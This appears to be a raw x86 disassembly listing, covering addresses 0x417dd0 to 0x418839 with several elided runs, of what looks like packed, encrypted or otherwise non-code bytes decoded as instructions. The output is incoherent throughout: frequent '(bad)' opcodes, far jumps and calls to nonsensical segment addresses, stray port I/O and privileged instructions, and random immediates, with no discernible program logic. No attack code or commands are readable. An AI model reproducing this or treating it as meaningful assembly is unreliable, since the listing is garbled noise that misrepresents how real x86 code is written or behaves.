  417dd0:	cmp    eax,0xd98252b9
  417dd5:	dec    ecx
  417dd6:	call   0x65cda377
  417ddb:	outs   dx,BYTE PTR ds:[esi]
  417ddc:	retf   0x89a3
  417ddf:	dec    ecx
  417de0:	aad    0x8
  417de2:	inc    edi
  417de3:	ret    0x55f2
  417de6:	push   ss
  417de7:	jno    0x417d8b
  417de9:	mov    ch,0xb7
  417deb:	cmp    esp,edi
  417ded:	inc    esp
	...
  417e56:	pop    ss
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	push   cs
  417e63:	xor    edi,0x1016721
  417e69:	add    BYTE PTR [eax],al
  417e6b:	add    DWORD PTR [eax],eax
  417e6d:	add    BYTE PTR [ecx],bh
  417e6f:	ins    BYTE PTR es:[edi],dx
  417e70:	call   0xbca5:0xb7dff879
  417e77:	outs   dx,BYTE PTR ds:[esi]
  417e78:	mov    eax,ds:0xd9578ea9
  417e7d:	stos   BYTE PTR es:[edi],al
  417e7e:	(bad)  
  417e7f:	xchg   ecx,eax
  417e80:	or     al,0xc8
  417e82:	jmp    0x85fd0bc1
  417e87:	(bad)  
  417e88:	push   ebx
  417e89:	push   0xa9e21151
  417e8e:	jbe    0x417ed6
  417e90:	or     BYTE PTR [ecx+0x1280a473],ch
  417e96:	lea    esp,[esi-0x228bc4b2]
  417e9c:	pop    ebp
  417e9d:	xor    DWORD PTR [esi-0x48],ebx
  417ea0:	test   DWORD PTR [esi],ebp
  417ea2:	and    eax,0x5168eff3
  417ea7:	inc    esi
  417ea8:	retf   
  417ea9:	repz mov edx,0x14ec90d8
  417eaf:	into   
  417eb0:	push   edi
  417eb1:	scas   al,BYTE PTR es:[edi]
  417eb2:	pop    ss
  417eb3:	stc    
  417eb4:	adc    DWORD PTR [esi-0x7b],ebx
  417eb7:	popf   
  417eb8:	cmp    al,BYTE PTR [eax-0x6e]
  417ebb:	leave  
  417ebc:	aam    0x53
  417ebe:	lock push 0x42
  417ec1:	out    dx,eax
  417ec2:	and    ah,BYTE PTR [esi+0x63]
  417ec5:	add    al,0x1b
  417ec7:	xor    al,0x1f
  417ec9:	cmp    DWORD PTR ds:0x11e4b907,ecx
  417ecf:	mov    ss,WORD PTR [esi]
  417ed1:	jecxz  0x417ee4
  417ed3:	test   eax,0xce666e65
  417ed8:	sbb    bh,cl
  417eda:	mov    al,0xd9
  417edc:	mov    esp,0xa86b8619
  417ee1:	adc    eax,0x128e2c42
  417ee6:	jmp    DWORD PTR [ebx-0x5ab42e37]
  417eec:	inc    edi
  417eed:	adc    bh,BYTE PTR [edi]
  417eef:	mov    eax,ds:0x3cc7ba47
  417ef4:	outs   dx,DWORD PTR ds:[esi]
  417ef5:	cmp    dl,cl
  417ef7:	ja     0x417f51
  417ef9:	les    ebp,FWORD PTR [edx-0x35]
  417efc:	ss push cs
  417efe:	daa    
  417eff:	xchg   ecx,eax
  417f00:	jp     0x417e98
  417f02:	mov    al,ds:0x87b17001
  417f07:	jge    0x417f76
  417f09:	pop    ss
  417f0a:	outs   dx,DWORD PTR ds:[esi]
  417f0b:	mov    ch,0xe2
  417f0d:	push   edi
  417f0e:	pop    edx
  417f0f:	into   
  417f10:	push   bp
  417f12:	cmp    cl,dh
  417f14:	inc    esp
  417f15:	mov    ch,0xbf
  417f17:	sub    eax,0xe2f80882
  417f1c:	adc    DWORD PTR [esi*8+0x7091ec1a],0xffffffcf
  417f24:	hlt    
  417f25:	aaa    
  417f26:	push   ebx
  417f27:	or     eax,0x94367433
  417f2c:	cwde   
  417f2d:	or     eax,0x747a2fbd
  417f32:	and    dh,BYTE PTR [esi+0x8196677]
  417f38:	cmp    ch,BYTE PTR [ebp-0x7ce36b29]
  417f3e:	xchg   edx,eax
  417f40:	inc    esp
  417f41:	pop    es
  417f42:	es cdq 
  417f44:	xchg   edx,eax
  417f45:	add    BYTE PTR [eax+ebx*8],0x40
  417f49:	inc    esp
  417f4a:	and    ah,BYTE PTR [eax-0x49]
  417f4d:	inc    ebp
  417f4e:	into   
  417f4f:	les    edx,FWORD PTR [ecx-0x64]
  417f52:	leave  
  417f53:	xchg   edx,eax
  417f54:	jnp    0x417f3d
  417f56:	popf   
  417f57:	sti    
  417f58:	jge    0x417f50
  417f5a:	sub    BYTE PTR [edx],dh
  417f5c:	mov    esi,0x8d566cc
  417f61:	jge    0x417f94
  417f63:	mov    ds:0xf9444c53,eax
  417f68:	pop    esi
  417f69:	and    BYTE PTR [eax+0x346357],bh
	...
  417fd3:	add    BYTE PTR [eax],al
  417fd5:	add    BYTE PTR [edx-0x1a],ah
  417fd8:	out    0x3b,al
  417fda:	out    0x3b,al
  417fdc:	(bad)  
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	dec    ebx
  417fe3:	or     eax,0x2670713
  417fe8:	add    DWORD PTR [eax],eax
  417fea:	add    BYTE PTR [ecx],al
  417fec:	add    BYTE PTR [eax],al
  417fee:	loopne 0x417fd4
  417ff0:	push   cs
  417ff1:	jnp    0x418021
  417ff3:	sbb    BYTE PTR [eax+0x3f9fa85a],0x6a
  417ffa:	mov    ecx,0x95cd51b7
  417fff:	mov    esi,0x540b5288
  418004:	fs ins BYTE PTR es:[edi],dx
  418006:	sbb    al,0x6a
  418008:	sahf   
  418009:	mov    WORD PTR [ebx+eax*2],ss
  41800c:	addr16 adc eax,0x2fec2be6
  418012:	sbb    DWORD PTR [esi+ebp*1+0x78],edi
  418016:	outs   dx,BYTE PTR ds:[esi]
  418017:	xchg   edi,eax
  418018:	jnp    0x417ffd
  41801a:	sub    dh,bh
  41801c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41801e:	xchg   esi,eax
  41801f:	repnz aaa 
  418021:	cmp    eax,DWORD PTR [ecx]
  418023:	pop    ebx
  418024:	lods   eax,DWORD PTR ds:[esi]
  418025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418026:	out    dx,eax
  418027:	sti    
  418028:	cmp    cl,cl
  41802a:	jecxz  0x4180a5
  41802c:	std    
  41802d:	add    DWORD PTR ds:0xde73ee8f,ecx
  418034:	adc    DWORD PTR [ebp+0xb490971],ecx
  41803a:	jo     0x417ffb
  41803c:	mov    al,ds:0x900aba3d
  418041:	xlat   BYTE PTR ds:[ebx]
  418042:	pop    eax
  418043:	dec    esp
  418044:	adc    edx,DWORD PTR ds:0x788c3932
  41804a:	(bad)  
  41804b:	or     esp,ebp
  41804d:	sti    
  41804e:	mov    eax,DWORD PTR [eax]
  418050:	add    DWORD PTR [edi-0x13959af6],edx
  418056:	bound  ebp,QWORD PTR [edx-0x17b10d05]
  41805c:	lods   eax,DWORD PTR ds:[esi]
  41805d:	enter  0xc6b5,0x8a
  418061:	mov    edx,0xe04b3350
  418066:	jnp    0x41802f
  418068:	push   esi
  418069:	mov    ch,0x9a
  41806b:	mov    ah,0x69
  41806d:	clc    
  41806e:	call   0xf39111b7
  418073:	pop    es
  418074:	clc    
  418075:	ins    BYTE PTR es:[edi],dx
  418076:	push   ecx
  418077:	scas   eax,DWORD PTR es:[edi]
  418078:	(bad)
  41807c:	leave  
  41807d:	leave  
  41807e:	stos   BYTE PTR es:[edi],al
  41807f:	mov    al,0xea
  418081:	add    ecx,esp
  418083:	push   es
  418084:	repz iret 
  418086:	out    dx,al
  418087:	xor    DWORD PTR [edx+0x6a860092],edi
  41808d:	jmp    0x80d5:0xf2920cc7
  418094:	ja     0x41803c
  418096:	adc    DWORD PTR [ecx-0x7a],esi
  418099:	push   ebx
  41809a:	pop    ebx
  41809b:	xchg   esi,eax
  41809c:	loop   0x4180c5
  41809e:	leave  
  41809f:	pop    ebp
  4180a0:	push   es
  4180a1:	mov    ebx,0x4e37f949
  4180a6:	dec    ebp
  4180a7:	mov    eax,ds:0xe30770d3
  4180ac:	add    esi,DWORD PTR [esi]
  4180ae:	mov    ah,bh
  4180b0:	ror    DWORD PTR gs:[edi+0x70],1
  4180b4:	xchg   DWORD PTR [eax+eiz*1],ebx
  4180b7:	mov    bh,0x7d
  4180b9:	xor    DWORD PTR [eax+0x9],edi
  4180bc:	lahf   
  4180bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180be:	xor    edx,edx
  4180c0:	or     eax,0xb8f2db55
  4180c5:	xchg   edi,eax
  4180c6:	out    0xb0,eax
  4180c8:	jo     0x4180bd
  4180ca:	into   
  4180cb:	idiv   DWORD PTR [ecx+0x72]
  4180ce:	mov    edi,0xaacc2883
  4180d3:	pop    ebp
  4180d4:	int    0x9c
  4180d6:	mov    ch,0x56
  4180d8:	addr16 sub dh,dh
  4180db:	or     DWORD PTR [ebp*4+0x18a43fbf],ebx
  4180e2:	pop    ebx
  4180e3:	mov    WORD PTR [edi],?
  4180e5:	jg     0x41812f
  4180e7:	xchg   ebp,eax
  4180e8:	addr16 or al,0x22
  4180eb:	mov    edi,0x9018
	...
  418154:	add    BYTE PTR [eax],al
  418156:	test   eax,0xff456b7e
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0xdb2fdebc,eax
  418163:	cmp    BYTE PTR [edx+0x1036702],al
  418169:	add    BYTE PTR [eax],al
  41816b:	add    DWORD PTR [eax],eax
  41816d:	add    dh,ch
  41816f:	daa    
  418170:	mov    al,ds:0x448c73eb
  418175:	dec    BYTE PTR [ebp-0x53]
  418178:	int    0x60
  41817a:	ret    0xc0a0
  41817d:	fwait
  41817e:	pusha  
  41817f:	mov    bh,BYTE PTR ds:0x5fbe0b50
  418185:	call   0x5a964920
  41818a:	scas   al,BYTE PTR es:[edi]
  41818b:	push   ebp
  41818c:	nop
  41818d:	imul   DWORD PTR [eax]
  41818f:	inc    edi
  418190:	mov    ebp,0xe47e4600
  418195:	or     BYTE PTR ds:0xac73a8f8,0x69
  41819c:	adc    eax,0x19b181ec
  4181a1:	test   DWORD PTR [esi+ebx*8],0x3222ec2e
  4181a8:	push   esp
  4181a9:	rcr    DWORD PTR [ecx+0x3f],0xff
  4181ad:	inc    edx
  4181ae:	xchg   ebx,eax
  4181af:	push   ebx
  4181b0:	add    DWORD PTR [edi+0x1fc09752],esp
  4181b6:	mov    bh,0x37
  4181b8:	inc    esi
  4181b9:	sbb    BYTE PTR [ebx-0xf],al
  4181bc:	lods   al,BYTE PTR ds:[esi]
  4181bd:	adc    ah,dh
  4181bf:	repnz hlt 
  4181c1:	add    al,0xb8
  4181c3:	pop    es
  4181c4:	or     ah,BYTE PTR [ebp+0x3694d4d6]
  4181ca:	shl    DWORD PTR [edi-0x59],0x3b
  4181ce:	test   eax,0x5fa45a77
  4181d3:	and    BYTE PTR [eax-0x1f],dl
  4181d6:	xor    eax,0xc73f07c6
  4181db:	mov    edi,0x18aa1950
  4181e0:	dec    esp
  4181e1:	sbb    eax,0x46950eb6
  4181e6:	fsubr  DWORD PTR [esi-0x1eeae0d6]
  4181ed:	cli    
  4181ee:	(bad)  
  4181ef:	fistp  QWORD PTR [esp+eiz*4-0x2f]
  4181f3:	add    al,0x59
  4181f5:	jmp    0x9b8:0xeab66559
  4181fc:	and    ecx,eax
  4181fe:	(bad)  
  4181ff:	lahf   
  418200:	aaa    
  418201:	sub    eax,0x104726b2
  418206:	pop    es
  418207:	(bad)  
  418208:	outs   dx,BYTE PTR ds:[esi]
  418209:	call   0x3af3:0x17ffa4a6
  418210:	adc    eax,0xfbb1718a
  418215:	mov    DWORD PTR [eax+0x59],ebp
  418218:	cmp    ch,BYTE PTR [ebp+0x5d]
  41821b:	jbe    0x418202
  41821d:	inc    esi
  41821e:	aas    
  41821f:	xchg   BYTE PTR [edi+ebp*8-0x2db57fa4],cl
  418226:	test   bl,dl
  418228:	in     al,dx
  418229:	and    dh,BYTE PTR [edi-0x36]
  41822c:	push   edi
  41822d:	xor    DWORD PTR [esi],eax
  41822f:	das    
  418230:	aad    0x9e
  418232:	clc    
  418233:	xchg   ecx,eax
  418234:	hlt    
  418235:	inc    ecx
  418236:	mov    ch,0xbe
  418238:	cmp    edi,esi
  41823a:	and    DWORD PTR ds:0xa9a2db29,ecx
  418240:	adc    esi,edi
  418242:	std    
  418243:	dec    ebx
  418244:	jg     0x4181e7
  418246:	dec    ecx
  418247:	in     al,0xb5
  418249:	retf   
  41824a:	xchg   BYTE PTR [ebx],al
  41824c:	cdq    
  41824d:	icebp  
  41824e:	out    dx,eax
  41824f:	dec    esp
  418250:	inc    eax
  418251:	clc    
  418252:	data16 mov BYTE PTR [edx+0x47],ch
  418256:	dec    edi
  418257:	and    eax,DWORD PTR [esi]
  418259:	push   esi
  41825a:	aaa    
  41825b:	push   ss
  41825c:	adc    edx,DWORD PTR [ecx+esi*4+0x2b]
  418260:	jae    0x418205
  418262:	mov    bh,0x3a
  418264:	mov    ecx,0x15de3d3d
  418269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41826a:	cmp    DWORD PTR [ecx+0x3b],eax
  41826d:	push   esp
	...
  4182d6:	aaa    
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0x3f04b8d6
  4182e4:	aaa    
  4182e5:	lock addr16 add al,0x1
  4182e9:	add    BYTE PTR [eax],al
  4182eb:	add    DWORD PTR [eax],eax
  4182ed:	add    al,ch
  4182ef:	xor    BYTE PTR [ecx+0x4e],0xba
  4182f3:	pop    esp
  4182f4:	sub    eax,0xf51a5988
  4182f9:	cmc    
  4182fa:	dec    ebp
  4182fb:	clc    
  4182fc:	fcom   QWORD PTR [edi+0x7d74bcc8]
  418302:	out    0xdc,eax
  418304:	repnz (bad) 
  418306:	das    
  418307:	ja     0x4182fe
  418309:	add    ah,0x9f
  41830c:	sar    DWORD PTR [ecx-0x2a],cl
  41830f:	gs test al,0x84
  418312:	add    eax,0xa5f04ca9
  418317:	adc    eax,0x56923f01
  41831c:	sar    ah,cl
  41831e:	aaa    
  41831f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418320:	xchg   ch,ah
  418322:	mov    bl,BYTE PTR [ecx-0x610d9882]
  418328:	ss mov dh,0xf1
  41832b:	pop    ss
  41832c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41832e:	out    0x8d,al
  418330:	push   0xffffffb4
  418332:	js     0x4182db
  418334:	push   ebp
  418335:	das    
  418336:	sbb    eax,eax
  418338:	sbb    cl,BYTE PTR [ecx]
  41833a:	and    DWORD PTR cs:[ecx-0x69],ecx
  41833e:	lock and ax,0x195d
  418343:	fld    st(2)
  418345:	std    
  418346:	imul   eax,DWORD PTR [ecx+ebx*1+0x4f],0xffffffcd
  41834b:	in     al,dx
  41834c:	or     eax,0xa6ae0460
  418351:	iret   
  418352:	leave  
  418353:	inc    ebp
  418354:	or     al,0x2a
  418356:	nop
  418357:	sub    bl,al
  418359:	lock xchg ecx,eax
  41835b:	cwde   
  41835c:	lock outs dx,DWORD PTR ds:[esi]
  41835e:	push   edx
  41835f:	in     al,0x96
  418361:	mov    ah,al
  418363:	clc    
  418364:	pop    es
  418365:	aas    
  418366:	dec    ebx
  418367:	dec    ebp
  418368:	jb     0x4183d5
  41836a:	cmp    DWORD PTR [ebp-0x3e],esp
  41836d:	and    al,0xb1
  41836f:	xchg   ebx,eax
  418370:	fnstcw WORD PTR [eax+0x7d]
  418373:	outs   dx,BYTE PTR ds:[esi]
  418374:	jns    0x418392
  418376:	mov    edx,0x5fe48731
  41837b:	or     eax,0x25da17f9
  418380:	in     eax,dx
  418381:	pop    edx
  418382:	mov    WORD PTR ds:0x627aca07,fs
  418388:	gs pop esi
  41838a:	ins    DWORD PTR es:[edi],dx
  41838b:	or     bh,bl
  41838d:	fs push edx
  41838f:	jl     0x418387
  418391:	cmp    esp,edx
  418393:	or     al,0x44
  418396:	add    ebp,DWORD PTR [eax-0x7d16207e]
  41839c:	mov    bh,0x53
  41839e:	fwait
  41839f:	adc    al,0x67
  4183a1:	sbb    BYTE PTR [eax+0x0],cl
  4183a4:	jo     0x4183de
  4183a6:	test   BYTE PTR [edx],0x64
  4183a9:	or     dl,dl
  4183ab:	repnz add al,0x4d
  4183ae:	bound  esi,QWORD PTR [ebp+esi*8+0x70]
  4183b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183b4:	in     al,0xd3
  4183b6:	cmp    DWORD PTR [esi-0x478e7eda],ebx
  4183bc:	mov    ebx,DWORD PTR [ebx+0x6f]
  4183bf:	fdivp  st(5),st
  4183c1:	loopne 0x418417
  4183c3:	jb     0x418430
  4183c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183c6:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183c8:	jge    0x4183b2
  4183ca:	pop    ebp
  4183cb:	in     al,dx
  4183cc:	or     esp,edx
  4183ce:	jbe    0x418377
  4183d0:	jno    0x418391
  4183d2:	bound  edi,QWORD PTR [eax]
  4183d4:	call   0x1f77d105
  4183d9:	fnstsw WORD PTR es:[eax-0x1a3b93d1]
  4183e0:	inc    ebp
  4183e1:	mov    edi,0xe4e40dc8
  4183e6:	call   0x30dd:0x8909ab4f
  4183ed:	cmp    al,BYTE PTR [eax]
	...
  418453:	add    BYTE PTR [eax],al
  418455:	add    ah,bl
  418457:	mov    bl,0x3f
  418459:	push   eax
  41845a:	jg     0x418438
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	icebp  
  418463:	(bad)  
  418464:	push   es
  418465:	dec    edi
  418466:	addr16 add eax,0x1000001
  41846c:	add    BYTE PTR [eax],al
  41846e:	inc    edx
  41846f:	test   BYTE PTR [esp+ecx*2+0x2d],dl
  418473:	xor    al,0x9d
  418475:	mov    ds:0x4c3db2b4,al
  41847a:	jns    0x418480
  41847c:	cmp    bh,ch
  41847e:	pop    ebx
  41847f:	fild   DWORD PTR [ecx-0x6c]
  418482:	std    
  418483:	jge    0x418417
  418485:	mov    ds:0xb83a4927,al
  41848a:	push   0xd6080602
  41848f:	int3   
  418490:	sahf   
  418491:	stos   BYTE PTR es:[edi],al
  418492:	dec    edi
  418493:	lea    esi,[edx+0x1c]
  418496:	adc    esp,ebp
  418498:	or     dl,BYTE PTR [edi+0x2f]
  41849b:	push   ss
  41849c:	in     eax,dx
  41849d:	mov    ah,dh
  41849f:	retf   
  4184a0:	jbe    0x41842c
  4184a2:	mov    DWORD PTR [edi],edx
  4184a4:	dec    ebx
  4184a5:	pop    ebx
  4184a6:	xor    al,0x59
  4184a8:	imul   edi,DWORD PTR [edx],0xffffffae
  4184ab:	and    dx,WORD PTR [ebx]
  4184ae:	mov    edx,DWORD PTR [ebx+ebp*4]
  4184b1:	mov    ah,0xaa
  4184b3:	ret    
  4184b4:	mov    bh,0xb3
  4184b6:	cmp    DWORD PTR [esi+ebx*1],eax
  4184b9:	pop    es
  4184ba:	fistp  DWORD PTR [edi-0x5c]
  4184bd:	aas    
  4184be:	xor    BYTE PTR [edx-0x6a],0x22
  4184c2:	not    DWORD PTR [ebp-0x56]
  4184c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184c6:	add    BYTE PTR [eax-0x60],0x4a
  4184ca:	shr    BYTE PTR [ecx],cl
  4184cc:	bound  ebx,QWORD PTR [ebp-0x18d71221]
  4184d2:	pop    ebp
  4184d3:	cs mov esi,0x4968ba6b
  4184d9:	mov    al,0x39
  4184db:	cmp    DWORD PTR [esi],eax
  4184dd:	pop    edx
  4184de:	lods   al,BYTE PTR ds:[esi]
  4184df:	mov    ds,esi
  4184e1:	cmp    eax,DWORD PTR [ecx-0x4d]
  4184e4:	fild   WORD PTR [ebx+0x7f4fe13]
  4184ea:	nop
  4184eb:	dec    esp
  4184ec:	xchg   ebp,eax
  4184ed:	mov    ds:0x6010fc62,eax
  4184f2:	or     BYTE PTR [eax-0x39],0x53
  4184f6:	dec    ecx
  4184f7:	rcl    DWORD PTR [eax-0x12],cl
  4184fa:	addr16 mov ch,0x74
  4184fd:	fsubr  QWORD PTR [esi+eax*2-0x28]
  418501:	push   ebp
  418502:	sub    DWORD PTR [edx+0x3c08b676],0xc4b0c965
  41850c:	(bad)  
  41850d:	jecxz  0x418516
  41850f:	mov    al,ds:0xa7051db6
  418514:	lahf   
  418515:	and    edx,esp
  418517:	cli    
  418518:	push   ebx
  418519:	lods   al,BYTE PTR ds:[esi]
  41851a:	pop    ebp
  41851b:	xchg   ebp,eax
  41851c:	and    DWORD PTR [eax+0x4319350a],esi
  418522:	adc    bl,BYTE PTR [eax]
  418524:	addr16 pop esi
  418526:	clc    
  418527:	je     0x4184d2
  418529:	sahf   
  41852a:	push   es
  41852b:	mov    bl,0x7c
  41852d:	jmp    0x845290e3
  418532:	int3   
  418533:	mov    dl,0x84
  418535:	xchg   ebp,eax
  418536:	jmp    0x5d283054
  41853b:	fstp   st(1)
  41853d:	push   edx
  41853e:	in     al,dx
  41853f:	dec    eax
  418540:	push   ebx
  418541:	and    BYTE PTR [ebp+0x73],ah
  418544:	xor    DWORD PTR [eax+ebx*2+0x8],ecx
  418548:	sbb    al,0x1b
  41854a:	or     eax,0xd0afe882
  41854f:	lods   al,BYTE PTR ds:[esi]
  418550:	repnz mov BYTE PTR [edi+0x430b7517],dl
  418557:	(bad)  
  418558:	ror    BYTE PTR [eax+edi*8+0x1387589e],1
  41855f:	pop    ds
  418560:	cwde   
  418561:	fstp   QWORD PTR [di-0x3cb9]
  418566:	xor    DWORD PTR [ebx-0x64],esi
  418569:	and    BYTE PTR [ebp+0x49],ah
  41856c:	rol    DWORD PTR [esi],cl
	...
  4185d6:	inc    ecx
  4185d7:	stc    
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	icebp  
  4185e3:	cmc    
  4185e4:	ins    BYTE PTR es:[edi],dx
  4185e5:	loopne 0x41864e
  4185e7:	push   es
  4185e8:	add    DWORD PTR [eax],eax
  4185ea:	add    BYTE PTR [ecx],al
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	mov    esi,0x37e8457f
  4185f3:	sbb    al,0x86
  4185f5:	leave  
  4185f6:	sahf   
  4185f7:	sar    bl,1
  4185f9:	not    BYTE PTR ds:0xdbd023db
  4185ff:	mov    edi,0xd35b43f4
  418604:	xor    al,0x77
  418606:	je     0x41865a
  418608:	outs   dx,DWORD PTR ds:[esi]
  418609:	cs stos DWORD PTR es:[edi],eax
  41860b:	rcl    esi,cl
  41860d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41860e:	ret    
  41860f:	jecxz  0x418668
  418611:	sbb    DWORD PTR ds:0xcd3bb245,ebx
  418617:	dec    edx
  418618:	bound  ecx,QWORD PTR [ebx+0x58f9e381]
  41861e:	inc    esp
  41861f:	xor    BYTE PTR ds:0xbab70823,0x7
  418626:	xchg   edi,eax
  418627:	or     BYTE PTR [esi-0x2f],cl
  41862a:	sbb    bh,bl
  41862c:	jmp    0x742c:0x38ab542f
  418633:	psubusb mm6,QWORD PTR [ecx]
  418636:	fs and al,0xfd
  418639:	sbb    BYTE PTR [edx+ecx*4+0x39],cl
  41863d:	add    al,BYTE PTR [edi+edi*1]
  418640:	jge    0x4185e1
  418642:	test   al,0x3b
  418644:	std    
  418645:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  418647:	cli    
  418648:	push   cs
  418649:	mov    esp,0x3c77baac
  41864e:	adc    DWORD PTR [ecx+edi*4],ebx
  418651:	xlat   BYTE PTR ds:[ebx]
  418652:	sub    eax,0x5b530bd3
  418657:	mov    BYTE PTR [ebp-0x538dba59],bl
  41865d:	lock test al,0x5e
  418660:	sbb    DWORD PTR [di],ebp
  418663:	outs   dx,DWORD PTR ds:[esi]
  418664:	retf   0xbd26
  418667:	push   ss
  418668:	inc    esi
  418669:	xchg   ebx,eax
  41866a:	add    ah,0x98
  41866d:	in     eax,0x46
  41866f:	fdivr  QWORD PTR [ebx-0x205831d5]
  418675:	nop
  418676:	mov    edi,0x1491c669
  41867b:	test   eax,0x908ba56d
  418680:	pop    ebp
  418681:	pop    esp
  418682:	mov    eax,ebp
  418684:	add    BYTE PTR [edx],bl
  418686:	jae    0x4186e9
  418688:	dec    ebp
  418689:	int3   
  41868a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41868b:	mov    al,0x21
  41868d:	or     DWORD PTR [edx+0x32fc6763],ecx
  418693:	pop    ds
  418694:	imul   ecx,DWORD PTR ds:0xf40d7454,0x55ceef27
  41869e:	lods   al,BYTE PTR ds:[esi]
  41869f:	jo     0x4186b7
  4186a1:	repz leave 
  4186a3:	adc    BYTE PTR [edx],dl
  4186a5:	mov    bl,0xe4
  4186a7:	adc    eax,0xe7f68739
  4186ac:	inc    esi
  4186ad:	in     eax,dx
  4186ae:	mov    bl,0xf
  4186b0:	mov    ecx,DWORD PTR [eax+0x5c583e80]
  4186b6:	jb     0x418660
  4186b8:	sub    ebp,ecx
  4186ba:	push   ebx
  4186bb:	fisub  WORD PTR [ecx]
  4186bd:	sub    BYTE PTR [esi],ch
  4186bf:	in     eax,0xc
  4186c1:	jb     0x418666
  4186c3:	fmul   DWORD PTR [edx]
  4186c5:	popa   
  4186c6:	cld    
  4186c7:	in     eax,dx
  4186c8:	icebp  
  4186c9:	sub    eax,0xd1aeef9f
  4186ce:	add    bl,al
  4186d0:	xchg   esp,eax
  4186d1:	ss sbb eax,0xe5ab84d6
  4186d7:	xor    edi,DWORD PTR [ebx+eiz*2-0x62]
  4186db:	call   0x7a3bf183
  4186e0:	xor    BYTE PTR [eax],al
  4186e2:	or     eax,0x91611502
  4186e7:	jecxz  0x4186a7
  4186e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186ea:	cmp    DWORD PTR [edi+0xc25c],0x0
	...
  418755:	add    BYTE PTR [ebx-0x44c35fd8],dl
  41875b:	mov    esp,0x8d0caf9f
  418760:	cmp    edx,edx
  418762:	cmp    al,0x31
  418764:	jo     0x4186f6
  418766:	addr16 pop es
  418768:	add    DWORD PTR [eax],eax
  41876a:	add    BYTE PTR [ecx],al
  41876c:	add    BYTE PTR [eax],al
  41876e:	jecxz  0x41873f
  418770:	sbb    al,0xea
  418772:	repnz mov ebp,0xcaf5d5ab
  418778:	cmp    ebp,DWORD PTR [esi]
  41877a:	(bad)  [edi-0x4d539612]
  418780:	shl    DWORD PTR [ecx],1
  418782:	neg    BYTE PTR [eax-0x21dca542]
  418788:	xchg   ecx,eax
  418789:	sbb    ebp,DWORD PTR [ecx+0x591a1159]
  41878f:	lea    edi,[ebp+0x6a0a97da]
  418795:	ret    0x7306
  418798:	jne    0x41878c
  41879a:	test   DWORD PTR [eax-0x400fe39d],ecx
  4187a0:	xchg   esp,eax
  4187a1:	push   ss
  4187a2:	jecxz  0x418750
  4187a4:	frstor [eax]
  4187a6:	jle    0x41879f
  4187a8:	add    dh,dh
  4187aa:	xchg   DWORD PTR [esp+ebx*2],edx
  4187ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187ae:	dec    ebp
  4187af:	mov    al,0xf7
  4187b1:	sti    
  4187b2:	push   eax
  4187b3:	add    bh,BYTE PTR [edi-0x1a]
  4187b6:	jecxz  0x4187a6
  4187b8:	addr16 pushf 
  4187ba:	or     bl,BYTE PTR [eax]
  4187bc:	or     DWORD PTR [edx+0x45],eax
  4187bf:	pop    esi
  4187c0:	mov    dh,0xf0
  4187c2:	mov    edi,0x4071084
  4187c7:	pop    ebp
  4187c8:	scas   al,BYTE PTR es:[edi]
  4187c9:	jno    0x418792
  4187cb:	in     eax,0xf7
  4187cd:	lea    ecx,[ecx-0x7e]
  4187d0:	mov    bh,0x7e
  4187d2:	and    DWORD PTR [eax+0x662f19f6],edx
  4187d8:	daa    
  4187d9:	in     al,0xa1
  4187db:	pop    esi
  4187dc:	sbb    DWORD PTR ds:0x9eff19d6,edx
  4187e2:	iret   
  4187e3:	nop
  4187e4:	dec    ebp
  4187e5:	test   esi,eax
  4187e7:	dec    ebx
  4187e8:	pop    esp
  4187e9:	and    al,0x78
  4187eb:	clc    
  4187ec:	mov    ebp,0x53d77b41
  4187f1:	jns    0x4187fd
  4187f3:	push   edx
  4187f4:	sub    BYTE PTR [eax],dh
  4187f6:	mov    cl,BYTE PTR [ecx]
  4187f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187f9:	enter  0x8761,0x87
  4187fd:	cld    
  4187fe:	leave  
  4187ff:	sub    ebp,DWORD PTR [edi]
  418801:	push   ds
  418802:	addr16 test eax,0x89e66986
  418808:	jo     0x4187e2
  41880a:	and    ch,BYTE PTR [ebp+0xb]
  41880d:	ss mov ch,0x6c
  418810:	(bad)  
  418811:	aam    0xee
  418813:	aas    
  418814:	or     eax,0x5412256c
  418819:	repnz mov ebp,0x6ddaab81
  41881f:	inc    ebx
  418820:	fst    DWORD PTR [ecx+edx*2]
  418823:	iret   
  418824:	mov    WORD PTR [edx],?
  418826:	fsub   QWORD PTR [edi+0x2fcaee98]
  41882c:	cs or  al,0x84
  41882f:	rcl    BYTE PTR [edx-0x17],1
  418832:	jecxz  0x4187ec
  418834:	jg     0x418817
  418836:	jnp    0x4187c9
  418838:	lods   al,BYTE PTR ds:[esi]
  418839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
